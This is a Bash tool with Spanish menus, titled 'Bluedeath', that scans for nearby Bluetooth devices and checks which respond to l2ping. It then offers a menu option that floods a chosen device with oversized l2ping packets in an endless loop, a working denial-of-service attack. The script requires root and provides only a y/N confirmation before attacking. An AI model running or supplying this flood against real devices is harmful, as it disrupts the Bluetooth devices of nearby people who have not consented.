#!/bin/bash

# Colores
RED="\e[91m"
GREEN="\e[92m"
BLUE="\e[94m"
PURPLE="\e[95m"
CYAN="\e[96m"
RESET="\e[0m"

# Función para imprimir el banner
imprimir_banner() {
    echo -e "${RED}"
    cat << "EOF"
 ▄▄▄▄    ██▓     █    ██ ▓█████ ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██ 
▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀ ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒
▒██▒ ▄██▒██░    ▓██  ▒██░▒███   ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░
▒██░█▀  ▒██░    ▓▓█  ░██░▒▓█  ▄ ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ 
░▓█  ▀█▓░██████▒▒▒█████▓ ░▒████▒░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓
░▒▓███▀▒░ ▒░▓  ░░▒▓▒ ▒ ▒ ░░ ▒░ ░ ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒
▒░▒   ░ ░ ░ ▒  ░░░▒░ ░ ░  ░ ░  ░ ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░
 ░    ░   ░ ░    ░░░ ░ ░    ░    ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░
 ░          ░  ░   ░        ░  ░   ░       ░  ░     ░  ░         ░  ░  ░
      ░                          ░                                                                                                                                                 
                                 by TheOffSecGirl
EOF
    echo -e "${RESET}"
}

# Imprimir banner
imprimir_banner



# Colores
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
CYAN='\e[36m'
BLUE='\e[34m'
RESET='\e[0m'
BOLD='\e[1m'

# Verificar root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Este script debe ejecutarse como root.${RESET}"
    exit 1
fi

# Verificar adaptador Bluetooth
hciconfig hci0 up &>/dev/null
if [[ $? -ne 0 ]]; then
    echo -e "${RED}[!] No se pudo activar el adaptador Bluetooth (hci0). Verifica que esté conectado.${RESET}"
    exit 1
fi


# Variables globales
SCAN_FILE="/tmp/bt_scan.txt"

# Función: Escanear dispositivos
scan_dispositivos() {
    echo -e "${YELLOW}[+] Escaneando dispositivos Bluetooth...${RESET}"
    hcitool scan > "$SCAN_FILE"
    if [[ ! -s $SCAN_FILE ]]; then
        echo -e "${RED}[-] No se detectaron dispositivos.${RESET}"
        return
    fi
    echo -e "${GREEN}[+] Dispositivos detectados:${RESET}"
    cat "$SCAN_FILE" | tail -n +2 | nl -w2 -s'. '
}

# Función: Ver conectados (al host)
ver_conectados() {
    echo -e "${CYAN}[+] Dispositivos conectados actualmente:${RESET}"
    hcitool con
}

# Función: Ver conectables (haciendo inquiry scan)
ver_conectables() {
    echo -e "${BLUE}[+] Escaneando dispositivos conectables (inquiry)...${RESET}"
    hcitool inq
}

# Función: Ver activos (responden a ping)
ver_activos() {
    if [[ ! -s $SCAN_FILE ]]; then
        echo -e "${RED}[!] No hay escaneo previo. Ejecuta primero la opción 1.${RESET}"
        return
    fi

    echo -e "${CYAN}[+] Verificando dispositivos activos (responden a ping)...${RESET}"
    cat "$SCAN_FILE" | tail -n +2 | while read -r mac name; do
        echo -ne "${YELLOW}→ Probando $mac ($name)...${RESET} "
        if l2ping -c 1 -t 1 "$mac" &>/dev/null; then
            echo -e "${GREEN}[ACTIVO]${RESET}"
        else
            echo -e "${RED}[NO RESPONDE]${RESET}"
        fi
    done
}

# Función: Ataque DoS
ataque_dos() {
    if [[ ! -s $SCAN_FILE ]]; then
        echo -e "${RED}[!] No hay escaneo previo. Ejecuta primero la opción 1.${RESET}"
        return
    fi

    cat "$SCAN_FILE" | tail -n +2 | nl -w2 -s'. '
    echo -e "${GREEN}[+] Selecciona el número del dispositivo a atacar:${RESET}"
    read -rp "Número: " seleccion

    target_mac=$(awk "NR==$((seleccion+1)) {print \$1}" "$SCAN_FILE")
    target_name=$(awk "NR==$((seleccion+1)) {print substr(\$0, index(\$0, \$2))}" "$SCAN_FILE")

    if [[ -z "$target_mac" ]]; then
        echo -e "${RED}[-] Selección inválida.${RESET}"
        return
    fi

    echo -e "${RED}[!] Se lanzará ataque DoS contra: $target_name ($target_mac)${RESET}"
    read -rp "¿Confirmar ataque? (y/N): " confirm
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo -e "${BLUE}[!] Ataque cancelado.${RESET}"
        return
    fi

    echo -e "${CYAN}[+] Enviando flood de pings... presiona Ctrl+C para detener.${RESET}"
    sleep 2
    while true; do
        l2ping -i hci0 -s 600 -f "$target_mac" &>/dev/null
    done
}

# Menú principal
while true; do
    echo -e "\n${BOLD}${YELLOW}== MENÚ PRINCIPAL ==${RESET}"
    echo "1. Escanear dispositivos Bluetooth"
    echo "2. Ver dispositivos conectados a tu equipo"
    echo "3. Ver dispositivos conectables cercanos"
    echo "4. Ver dispositivos activos (que responden a ping)"
    echo "5. Ejecutar ataque DoS (l2ping flood)"
    echo "6. Salir"
    read -rp "Seleccione una opción: " opcion

    case "$opcion" in
        1) scan_dispositivos ;;
        2) ver_conectados ;;
        3) ver_conectables ;;
        4) ver_activos ;;
        5) ataque_dos ;;
        6) echo -e "${BLUE}[!] Saliendo...${RESET}"; exit 0 ;;
        *) echo -e "${RED}[-] Opción inválida.${RESET}" ;;
    esac
done
